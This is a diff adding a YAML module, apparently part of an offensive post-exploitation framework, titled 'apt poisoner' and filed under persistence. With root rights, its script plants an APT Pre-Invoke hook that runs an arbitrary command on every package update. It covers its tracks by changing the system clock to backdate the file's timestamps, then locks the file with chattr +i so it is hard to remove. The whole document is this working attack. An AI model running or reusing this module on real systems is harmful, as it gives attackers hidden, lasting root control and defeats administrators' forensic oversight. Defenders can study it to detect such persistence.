@@ -1,0 +1,17 @@
+name: "apt poisoner"
+description: "Adds apt entry with command execution"
+category: persistence
+need_root: true
+variables:
+  - name: cmd
+    description: "Command to execute"
+priority: 1000
+tip: "APT is poisoned with command '{{cmd}}'"
+script: |
+  NOW=$(date +@%s)
+  date -s "$(stat -c '@%Z' /etc/hostname)"
+  echo 'APT::Update::Pre-Invoke {"{{cmd}}"};' | sudo tee /etc/apt/apt.conf.d/20packageupdate
+  touch /etc/apt/apt.conf.d/20packageupdate
+  chattr +i /etc/apt/apt.conf.d/20packageupdate
+  date -s "$NOW"
+  unset NOW
